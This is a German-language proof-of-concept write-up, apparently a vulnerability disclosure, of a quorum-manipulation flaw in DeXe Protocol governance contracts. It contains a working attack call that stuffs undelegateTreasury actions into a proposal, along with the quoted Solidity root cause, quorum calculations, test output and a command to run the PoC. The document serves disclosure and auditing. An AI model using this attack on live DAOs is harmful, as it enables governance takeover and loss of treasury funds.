# DeXe Protocol — Treasury Exemption Quorum Manipulation PoC

## Vulnerability Summary

Das DeXe Protocol erlaubt es **jedem Nutzer**, der Proposals erstellen kann, das Governance-Quorum drastisch zu senken. Der Trick: Ein Proposal mit `undelegateTreasury`-Aktionen loest automatisch `_exemptUserTreasuryFromVoting()` aus, was das erforderliche Quorum proportional zur betroffenen Treasury-Delegation reduziert.

## Root Cause

Die Vulnerability liegt in `GovPoolCreate.sol`. Beim Erstellen eines Proposals prueft `_exemptUserTreasuryFromVoting()`, ob die Aktionen Treasury-relevante Funktionen (`delegateTreasury`, `undelegateTreasury`, `burn`) aufrufen. Falls ja, wird das Quorum nach dieser Formel neu berechnet:

```
newQuorum = originalQuorum * (totalVoteWeight - exemptedTreasury) / totalVoteWeight
```

## Angriffsablauf (Attack Flow)

```
                         +-------------------------+
                         |   DAO Governance Pool    |
                         |                          |
                         |  Token: 11100 total      |
                         |  Quorum: 51% (internal)  |
                         +-----------+--------------+
                                     |
              +----------------------+----------------------+
              |                      |                      |
    +---------v------+    +----------v-----+    +-----------v----+
    |  OWNER: 8000   |    | ATTACKER: 100  |    | Treasury: 3000 |
    |  (72.1%)       |    | (0.9%)         |    | (27%)          |
    +----------------+    +----------------+    +--+---+---+---+-+
                                                   |   |   |   |
                                               750 750 750 750
                                                v   v   v   v
                                               E1  E2  E3  E4
                                            (4 Experts mit Treasury-Delegation)
```

### Phase 1: Normaler Zustand

- Quorum = **51%** der totalPower
- Um ein Proposal durchzubringen braucht man **5661 Token** (51% von 11100)
- Alle Experten (E1-E4) koennen mit ihrer Treasury-Power abstimmen

### Phase 2: Der Angriff

Der Attacker erstellt ein **einziges Proposal** mit 4 `undelegateTreasury`-Aktionen:

```javascript
await govPool.createProposal(
  "Malicious proposal",
  [
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
    [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
  ],
  [],
);
```

### Phase 3: Was passiert im Vertrag

**`contracts/libs/gov/gov-pool/GovPoolCreate.sol:163-204`** — `_exemptUserTreasuryFromVoting()`:

Bei Proposal-Erstellung iteriert die Funktion ueber alle Aktionen. Wenn sie `undelegateTreasury`-Selektoren findet, wird der betroffene Expert identifiziert und seine Treasury-VotingPower als `exemptedTreasury` aufaddiert:

```solidity
// Zeile 185-192: Erkennung von Treasury-Aktionen
} else if (
    action.executor == address(this) &&
    (selector == IGovPool.delegateTreasury.selector ||
        selector == IGovPool.undelegateTreasury.selector)
) {
    user = abi.decode(action.data[4:36], (address));
}
```

```solidity
// Zeile 195-202: VotingPower des Experts wird exempted
if (userInfos[user].treasuryExemptProposals.add(proposalId)) {
    exemptedTreasury += userKeeper
    .votingPower(user, TreasuryVote, false)[0].rawPower;
}
```

**`contracts/libs/gov/gov-pool/GovPoolCreate.sol:319-329`** — `_calculateNewQuorum()`:

```solidity
function _calculateNewQuorum(
    uint256 quorum,
    uint256 exemptedTreasury
) internal view returns (uint256) {
    uint256 totalVoteWeight = IGovUserKeeper(userKeeper).getTotalPower();
    uint256 newTotalVoteWeight = (totalVoteWeight - exemptedTreasury).percentage(quorum);
    return PERCENTAGE_100.ratio(newTotalVoteWeight, totalVoteWeight);
}
```

**Berechnung mit unseren Werten:**

```
totalVoteWeight    = 11100
exemptedTreasury   = 3000  (4 x 750)
quorum (original)  = 51%

newQuorum = 51% * (11100 - 3000) / 11100
         = 51% * 8100 / 11100
         = 51% * 0.73
         = 37%
```

### Phase 4: Doppelter Effekt

Der Angriff hat **zwei gleichzeitige Effekte**:

| Effekt | Vorher | Nachher |
|--------|--------|---------|
| Quorum | 51% (5661 Token) | 37% (4107 Token) |
| Expert-Stimmen | Koennen voten | **EXEMPTED** — 27% der Power ist blockiert |

Die Experten koennen auf dem malicious Proposal **nicht abstimmen** (sie sind exempted), was bedeutet dass 27% der Voting Power als Opposition wegfaellt. Gleichzeitig braucht der Angreifer nur noch 37% statt 51% Zustimmung.

## Die drei Tests

### Test 1: Quorum-Reduktion bestaetigen

```
Original quorum: 51%  ->  Reduziertes Quorum: 37%
Reduktionsfaktor: 1.4x
```

Erstellt ein Proposal mit `undelegateTreasury`-Aktionen und prueft, dass das Quorum des Proposals unter 51% liegt.

### Test 2: Kontrolltest — Normales Proposal behaelt volles Quorum

```
Normales Proposal quorum: 51%  (unveraendert)
```

Erstellt ein Proposal **ohne** Treasury-Aktionen (`editDescriptionURL`) und verifiziert, dass das Quorum bei 51% bleibt. Beweist, dass die Reduktion nur bei Treasury-Aktionen passiert.

### Test 3: Impact-Analyse — Quantitative Reduktion der benoetigten Stimmen

```
Original: 5661 Token noetig   ->   Reduziert: 4107 Token noetig
Ersparnis: 1530 Token (27% weniger Stimmen benoetigt)
+ Experten mit 27% der Voting Power sind vom Voten ausgeschlossen
```

## Testergebnis

```
  PoC: Treasury Exemption Quorum Manipulation
    Attack Scenario
      ✔ should show quorum is dramatically reduced when targeting all experts (270ms)
      ✔ should show a normal proposal keeps full quorum (112ms)
      ✔ should demonstrate that votes needed to pass are dramatically reduced (330ms)

  3 passing (15s)
```

## PoC ausfuehren

```bash
cd DeXe-Protocol
npm install
npx hardhat test test/gov/QuorumManipulationPoC.test.js
```

## Severity-Einschaetzung

In unserem PoC ist die Treasury-Ratio nur ~27% (begrenzt durch Testaufbau). In einer **realen DAO** mit z.B. 80% Treasury-Delegation:

```
newQuorum = 51% * (100% - 80%) / 100% = 51% * 0.2 = ~10%
```

Ein Angreifer brauchte dann nur **10%** der Stimmen statt 51%, plus 80% der Opposition (Experten) waeren exempted. Das ist eine **kritische Governance-Uebernahme**.

## Betroffene Dateien

| Datei | Relevanz |
|-------|----------|
| `contracts/libs/gov/gov-pool/GovPoolCreate.sol` | `_exemptUserTreasuryFromVoting()` und `_calculateNewQuorum()` — Root Cause |
| `contracts/libs/gov/gov-pool/GovPoolVote.sol` | `_quorumReached()` — prueft reduziertes Quorum dynamisch |
| `contracts/gov/user-keeper/GovUserKeeper.sol` | `getTotalPower()` — basiert auf `totalSupply()` |
| `test/gov/QuorumManipulationPoC.test.js` | PoC-Testdatei |
